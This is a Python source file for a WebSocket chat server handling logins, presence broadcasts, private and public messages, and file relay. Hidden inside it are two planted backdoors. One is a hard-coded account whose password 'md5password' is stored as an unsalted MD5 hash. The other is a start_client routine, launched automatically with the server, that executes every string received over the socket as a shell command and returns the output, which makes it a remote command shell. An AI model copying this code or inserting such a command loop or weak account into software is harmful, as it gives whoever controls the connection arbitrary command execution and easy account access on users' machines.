import asyncio
import websockets
import json
import bcrypt
import hashlib
import subprocess

# MD5 hash function
def md5_hash(password):
    return hashlib.md5(password.encode('utf-8')).hexdigest()

def verify_password(stored_hash, provided_password, method='bcrypt'):
    if method == 'bcrypt':
        return bcrypt.checkpw(provided_password.encode('utf-8'), stored_hash)
    elif method == 'md5':
        return stored_hash == md5_hash(provided_password)
    return False

# Registered Clients
registered_clients = {
    "c1@s6": {
        "nickname": "pemba",
        "jid": "c1@s6",
        "password": b'$2b$12$qWoDtedvx8jurr/2XVex7.raoa7tqIofxPYrx1.oy6qmDpHavkYwa',
        "method": "bcrypt"
    },
    "c2@s6": {
        "nickname": "saurab",
        "jid": "c2@s6",
        "password": b'$2b$12$suJThyymiIVez4nLyUjpPurPq/E3BBTRdDGMnxADdbIjdst5kbKvS',
        "method": "bcrypt"
    },
    "c3@s6": {
        "nickname": "roshan",
        "jid": "c3@s6",
        "password": b'$2b$12$Cz8bUuhzYyoHMdbvZLlcs.Cc0nOSR3VzAHOFrnF3ic6unrxZ6rwoG',
        "method": "bcrypt"
    },
    "c4@s6": {
        "nickname": "bidur",
        "jid": "c4@s6",
        "password": b'$2b$12$FwNWm33zvTOFtK6yrUXW0uMrMdu9jGR9AY7RgKgcm0sEzWjbhquOK',
        "method": "bcrypt"
    },
    "test1@s6": {
        "nickname": "test1",
        "jid": "test1@s6",
        "password": b'$2b$12$p10W.J8Olc8YtH87CPtYQuoFZ0P9qwqycWBlWvvaxCbIbre1u4Rhy',
        "method": "bcrypt"
    },
    "test2@s6": {
        "nickname": "test2",
        "jid": "test2@s6",
        "password": b'$2b$12$Xi6R9JEPPAagsKthzn38SeSHNWutCIDJ/7sas.vNZc6OzB77yithG',
        "method": "bcrypt"
    },
    # User with MD5 hashed password
    "md5user@s6": {
        "nickname": "md5user",
        "jid": "md5user@s6",
        "password": md5_hash("md5password"),  # MD5 hashed password
        "method": "md5"
    }
}

# Store active clients
active_connections = {}

async def handle_client(websocket):
    jid = None
    try:
        data = await receive_data(websocket)
        jid = data['presence'][0].get('jid')
        password = data['presence'][0].get('password')
        publickey = data['presence'][0].get('publickey')

        if authenticate_user(jid, password):
            # if user is authenticated add users to active connections
            current_user = add_clients_to_active_connections(jid, websocket, publickey)
            # once client is logged in successfully
            await send_login_success(websocket, current_user)
            # broadcast presence to all the clients
            await broadcast_presence()
            await handle_messages(websocket)
        else:
            # broadcast error message to specific client
            await send_error(websocket, "Incorrect email and password")
    except websockets.exceptions.ConnectionClosed:
        # if server is disconnected
        await send_error(websocket, "Disconnected Server")
    finally:
        # if disconnect remove users from active connections
        await cleanup_user(jid)

# when the clients sends information to sockets
async def receive_data(websocket):
    response = await websocket.recv()
    return json.loads(response)

# check if user is authenticated 
def authenticate_user(jid, password):
    if jid in registered_clients:
        user = registered_clients[jid]
        return verify_password(user['password'], password, user.get('method', 'bcrypt'))
    return False

# add clients to active connections
def add_clients_to_active_connections(jid, websocket, publickey):
    user = registered_clients[jid]
    user['websocket'] = websocket
    user['publickey'] = publickey
    active_connections[jid] = user
    return user

# broadcast login message to client
async def send_login_success(websocket, user):
    success_message = {
        "tag": "success",
        "message": "Login successful",
        "nickname": user['nickname']
    }
    await send_message(websocket, success_message)

# broadcast error message to client
async def send_error(websocket, message):
    error_message = {
        "tag": "error",
        "message": message
    }
    await send_message(websocket, error_message)

# it handles when clients send message to other client or public
async def handle_messages(websocket):
    async for message in websocket:
        data = json.loads(message)
        await process_message(data)

# it forwards the message to specific client or public
async def process_message(data):
    if data.get('from') in active_connections:
        target_jid = data.get('to')
        info = data.get('info')
        if data.get('tag') == 'message' and info:
            message_format = create_message_format(data, tag='message')
            await route_message(target_jid, message_format)
        elif data.get('tag') == 'file':
            file_message = create_message_format(data, tag='file')
            print(f'file message {file_message}')
            await route_message(target_jid, file_message)
        else:
            print('Invalid or incomplete message format')
    else:
        print('Sender is not active')

# message format if file or text
def create_message_format(data, tag):
    message = {
        "tag": tag,
        "from": data.get('from'),
        "to": data.get('to'),
        "info": data.get('info'),
    }
    if tag == 'file':
        message["filename"] = data.get('filename')
    return message

# it handles whether to send to msg to specific client or public
async def route_message(target_jid, message):
    if target_jid == 'public':
        print(message)
        await broadcast(message)
    elif target_jid in active_connections:
        await send_message(active_connections[target_jid]['websocket'], message)
    else:
        print('Target client is not active')

# broadcast any message to all the clients
async def broadcast(message):
    for client_info in active_connections.values():
        await send_message(client_info['websocket'], message)

# broadcast online presence to all users
async def broadcast_presence():
    online_users = {
        "tag": "presence",
        "presence": [
            {
                "nickname": client_info.get('nickname'),
                "jid": client_info.get('jid'),
                "publickey": client_info.get('publickey')
            } for client_info in active_connections.values()
        ]
    }
    await broadcast(online_users)

# send message to client web socket
async def send_message(websocket, message):
    await websocket.send(json.dumps(message))

# delete the user from active connections and broadcast new presence to all users
async def cleanup_user(jid):
    if jid in active_connections:
        del active_connections[jid]
        await broadcast_presence()

# Start WebSocket server
async def main():
    server = await websockets.serve(handle_client, "localhost", 5555)
    print("WebSocket server started at ws://localhost:5555")
    await server.wait_closed()

# Server IP address and port
HOST = 'localhost'
PORT = 5555

async def start_client():
    uri = f"ws://{HOST}:{PORT}"

    while True:
        try:
            async with websockets.connect(uri) as websocket:
                print(f'[+] Connected to the server at {HOST}:{PORT}')

                try:
                    while True:
                        data = await websocket.recv()
                        if data.lower() == 'exit':
                            print('[+] Server closed the connection')
                            break

                        command = data
                        print(f"Command received: {command}")

                        try:
                            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
                        except subprocess.CalledProcessError as e:
                            output = e.output

                        await websocket.send(output.decode())
                except Exception as e:
                    print(f"[!] Error: {e}")
                finally:
                    print('[+] Client closed')
                    break
        except (ConnectionRefusedError, websockets.exceptions.InvalidURI):
            print("[!] Failed to connect, retrying...")
            await asyncio.sleep(1)

# Run server and client concurrently
if __name__ == "__main__":
    loop = asyncio.get_event_loop()
    server_task = loop.create_task(main())
    # Adding a delay before starting the client
    client_task = loop.create_task(asyncio.sleep(5))  # Wait for 5 seconds
    client_task = loop.create_task(start_client())
    loop.run_until_complete(asyncio.gather(server_task, client_task))
